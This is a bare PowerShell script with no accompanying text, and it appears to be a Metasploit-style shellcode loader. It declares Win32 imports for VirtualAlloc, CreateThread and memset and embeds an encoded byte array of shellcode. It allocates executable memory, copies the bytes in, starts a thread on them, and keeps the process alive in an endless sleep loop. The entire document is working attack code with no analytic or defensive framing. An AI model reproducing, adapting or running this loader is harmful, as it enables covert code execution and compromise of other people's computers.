
$UM3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $UM3 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x9f,0x7b,0x54,0xc4,0xdb,0xd6,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x83,0xc3,0x04,0x31,0x43,0x0f,0x03,0x43,0x90,0x99,0xa1,0x38,0x46,0xdf,0x4a,0xc1,0x96,0x80,0xc3,0x24,0xa7,0x80,0xb0,0x2d,0x97,0x30,0xb2,0x60,0x1b,0xba,0x96,0x90,0xa8,0xce,0x3e,0x96,0x19,0x64,0x19,0x99,0x9a,0xd5,0x59,0xb8,0x18,0x24,0x8e,0x1a,0x21,0xe7,0xc3,0x5b,0x66,0x1a,0x29,0x09,0x3f,0x50,0x9c,0xbe,0x34,0x2c,0x1d,0x34,0x06,0xa0,0x25,0xa9,0xde,0xc3,0x04,0x7c,0x55,0x9a,0x86,0x7e,0xba,0x96,0x8e,0x98,0xdf,0x93,0x59,0x12,0x2b,0x6f,0x58,0xf2,0x62,0x90,0xf7,0x3b,0x4b,0x63,0x09,0x7b,0x6b,0x9c,0x7c,0x75,0x88,0x21,0x87,0x42,0xf3,0xfd,0x02,0x51,0x53,0x75,0xb4,0xbd,0x62,0x5a,0x23,0x35,0x68,0x17,0x27,0x11,0x6c,0xa6,0xe4,0x29,0x88,0x23,0x0b,0xfe,0x19,0x77,0x28,0xda,0x42,0x23,0x51,0x7b,0x2e,0x82,0x6e,0x9b,0x91,0x7b,0xcb,0xd7,0x3f,0x6f,0x66,0xba,0x57,0x5c,0x4b,0x45,0xa7,0xca,0xdc,0x36,0x95,0x55,0x77,0xd1,0x95,0x1e,0x51,0x26,0xda,0x34,0x25,0xb8,0x25,0xb7,0x56,0x90,0xe1,0xe3,0x06,0x8a,0xc0,0x8b,0xcc,0x4a,0xed,0x59,0x78,0x4e,0x79,0x0c,0x69,0xc5,0x85,0xb8,0x93,0xe5,0x6a,0x7f,0x1d,0x03,0xc4,0x2f,0x4d,0x9c,0xa4,0x9f,0x2d,0x4c,0x4c,0xca,0xa1,0xb3,0x6c,0xf5,0x6b,0xdc,0x06,0x1a,0xc2,0xb4,0xbe,0x83,0x4f,0x4e,0x5f,0x4b,0x5a,0x2a,0x5f,0xc7,0x69,0xca,0x11,0x20,0x07,0xd8,0xc5,0xc0,0x52,0x82,0x43,0xde,0x48,0xa9,0x6b,0x4a,0x77,0x78,0x3c,0xe2,0x75,0x5d,0x0a,0xad,0x86,0x88,0x01,0x64,0x13,0x73,0x7d,0x89,0xf3,0x73,0x7d,0xdf,0x99,0x73,0x15,0x87,0xf9,0x27,0x00,0xc8,0xd7,0x5b,0x99,0x5d,0xd8,0x0d,0x4e,0xf5,0xb0,0xb3,0xa9,0x31,0x1f,0x4b,0x9c,0xc3,0x63,0x9a,0xd8,0xb1,0x8d,0x1e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$5eda=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($5eda.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$5eda,0,0,0);for (;;){Start-sleep 60};

